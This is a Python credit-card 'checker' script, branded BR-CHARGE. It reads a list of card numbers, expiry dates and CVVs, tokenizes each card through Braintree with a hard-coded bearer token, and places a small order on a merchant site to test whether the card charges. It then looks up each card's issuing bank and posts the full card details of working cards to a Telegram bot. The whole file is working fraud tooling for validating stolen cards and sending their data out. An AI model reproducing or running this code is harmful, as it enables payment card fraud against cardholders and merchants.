import requests,os
from user_agent import *
Z = '\033[1;31m' #احمر
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
gg = str(generate_user_agent())
took = input(X+"\n 𝗧𝗢𝗞𝗘𝗡 ➩ ")
IID = input(F+"\n 𝗜𝗗 ➩ ")
os.system("clear")
try:
 from cfonts import render, say
except:
 os.system('pip install python-cfonts')
output = render('BR-CHARGE', colors=['blue', 'red'], align='center')
print(output)
fi = input(B+" 𝗰𝗼𝗺𝗯𝗼 𝗹𝗶𝘀𝘁 ➩ ")
print("\n")
file = open(fi,'r')
start_num = 0
for P in file.readlines():
    start_num += 1
    n = P.split('|')[0]
    bin3=n[:6]
    mm=P.split('|')[1]
    if int(mm) == 12 or int(mm) == 11 or int(mm) == 10:
    	mm = mm
    elif '0' not in mm:
    	mm = f'0{mm}'
    else:
    	mm = mm
    yy=P.split('|')[2]
    cvc=P.split('|')[3].replace('\n', '')
    P=P.replace('\n', '')	
    if "20" not in yy:
        yy = f'20{yy}'
    else:
    	yy = yy
    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'ar-MA,ar;q=0.9,en-US;q=0.8,en;q=0.7,fr-FR;q=0.6,fr;q=0.5',
        'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjUyOTI3MDYsImp0aSI6ImEyMWVjYzQzLWQ1ZTgtNGE2Mi05MzU4LWUyODQ1ZGQ3YzI3ZSIsInN1YiI6Imc3Y2JjdHluc2c0ZmJqY3giLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Imc3Y2JjdHluc2c0ZmJqY3giLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.7k2R8qv9cejkE1xkVWbAP0eCqn56_5JSijJthj7nQ_CcHnv6Hy33Gn2hh3D594vEXH4tT0ikmttpeekzzCQoDw',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }
    
    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': 'ec25ccd7-2225-4909-a35f-318da5fa6c00',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': n,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                    'billingAddress': {
                        'postalCode': '90001',
                    },
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
    
    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    id = response.json()["data"]['tokenizeCreditCard']["token"]
    headers = {
        'authority': 'api.zephyr-sim.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'ar-MA,ar;q=0.9,en-US;q=0.8,en;q=0.7,fr-FR;q=0.6,fr;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://zephyr-sim.com',
        'referer': 'https://zephyr-sim.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }
    
    json_data = {
        'paymentMethodNonce': id,
        'email': 'yassin1999ssyy@gmail.com',
        'cart': [
            {
                'productId': 'HOBBYIST-PACK',
                'quantity': 1,
                'isUpsell': False,
                'isDownsell': False,
            },
        ],
        'billingCountry': 'US',
        'billingStateProvince': 'CA',
        'billingPostalCode': '90001',
        'expedited': False,
        'total': 9.99,
    }
    
    res = requests.post('https://api.zephyr-sim.com/v2/orders/braintree', headers=headers, json=json_data)
    if res.json()["statusCode"] == 400 :
        mag = res.json()["message"]
        if mag == "Insufficient Funds" :
            bin = P[:6]
            url = "https://transfunnel.io/projects/chargeback/bin_check.php"
            payload = "{\"bin_number\":\""+str(bin)+"\"}"
            headers = {
              'User-Agent': str(generate_user_agent()),
              'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
              'sec-ch-ua-platform': "\"Android\"",
              'sec-ch-ua-mobile': "?1",
              'content-type': "text/plain;charset=UTF-8",
              'origin': "https://www.chargebackgurus.com",
              'sec-fetch-site': "cross-site",
              'sec-fetch-mode': "cors",
              'sec-fetch-dest': "empty",
              'referer': "https://www.chargebackgurus.com/bin-look-up",
              'accept-language': "ar-MA,ar;q=0.9,en-US;q=0.8,en;q=0.7,fr-FR;q=0.6,fr;q=0.5"
            }
            info = requests.post(url, data=payload, headers=headers).json()["results"]
            bi = info["binNumber"]
            bank = info["issuingBank"]
            brand = info['cardBrand']
            type = info["cardType"]
            card = info["cardCat"]
            cantry = info["countryName"]
            cantry1 = info["countryA2"]
            url = info["issuerWebsite"]
            phone = info["issuerContact"]
            info = f'''
𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅ 
- - - - - - - - - - - - - - - - - - - - - - -
➫ 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 -> 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 𝟵$ 🔥✅
➫  𝗠𝗲𝘀𝘀𝗮𝗴𝗲  -> {mag} ✅
- - - - - - - - - - - - - - - - - - - - - - -
➫ 𝗖𝗔𝗥𝗗 -> {P}
➫ 𝗕𝗜𝗡 -> {bi} - {brand} - {type} - {card} 
➫ 𝗕𝗔𝗡𝗞 -> {bank}
➫ 𝗨𝗥𝗟 -> {url}
➫ 𝗣𝗛𝗢𝗡𝗘 -> {phone}
➫ 𝗖𝗢𝗨𝗡𝗥𝗧𝗬 -> {cantry} ({cantry1})  
- - - - - - - - - - - - - - - - - - - - - - -
➫ 𝗕𝗬 ⇉ @FV7FV7'''
            print(F+info)
            requests.get('https://api.telegram.org/bot' + str(took) + '/sendMessage?chat_id=' + str(IID) + '&text=' + str(info))
        else :
            print(f"{R}[{start_num}] {P} | {mag} ")
    else :
        bin = P[:6]
        url = "https://transfunnel.io/projects/chargeback/bin_check.php"
        payload = "{\"bin_number\":\""+str(bin)+"\"}"
        headers = {
          'User-Agent': str(generate_user_agent()),
          'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
          'sec-ch-ua-platform': "\"Android\"",
          'sec-ch-ua-mobile': "?1",
          'content-type': "text/plain;charset=UTF-8",
          'origin': "https://www.chargebackgurus.com",
          'sec-fetch-site': "cross-site",
          'sec-fetch-mode': "cors",
          'sec-fetch-dest': "empty",
          'referer': "https://www.chargebackgurus.com/bin-look-up",
          'accept-language': "ar-MA,ar;q=0.9,en-US;q=0.8,en;q=0.7,fr-FR;q=0.6,fr;q=0.5"
        }
        info = requests.post(url, data=payload, headers=headers).json()["results"]
        bi = info["binNumber"]
        bank = info["issuingBank"]
        brand = info['cardBrand']
        type = info["cardType"]
        card = info["cardCat"]
        cantry = info["countryName"]
        cantry1 = info["countryA2"]
        url = info["issuerWebsite"]
        phone = info["issuerContact"]
        info = f'''
𝗖𝗛𝗔𝗥𝗚𝗘𝗗 🔥
- - - - - - - - - - - - - - - - - - - - - - -
➫ 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 -> 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗖𝗛𝗔𝗥𝗚𝗘 𝟭𝟳$ 🔥✅
➫  𝗠𝗲𝘀𝘀𝗮𝗴𝗲  -> 𝘁𝗵𝗮𝗻𝗸 𝘆𝗼𝘂 𝗳𝗼𝗿 𝘆𝗼𝘂𝗿 𝗼𝗿𝗱𝗲𝗿! ✅
- - - - - - - - - - - - - - - - - - - - - - -
➫ 𝗖𝗔𝗥𝗗 -> {P}
➫ 𝗕𝗜𝗡 -> {bi} - {brand} - {type} - {card} 
➫ 𝗕𝗔𝗡𝗞 -> {bank}
➫ 𝗨𝗥𝗟 -> {url}
➫ 𝗣𝗛𝗢𝗡𝗘 -> {phone}
➫ 𝗖𝗢𝗨𝗡𝗥𝗧𝗬 -> {cantry} ({cantry1})  
- - - - - - - - - - - - - - - - - - - - - - -
➫ 𝗕𝗬 ⇉ @FV7FV7'''
        print(F+info)
        requests.get('https://api.telegram.org/bot' + str(took) + '/sendMessage?chat_id=' + str(IID) + '&text=' + str(info))
        print(res.text)       
    import time
    time.sleep(4)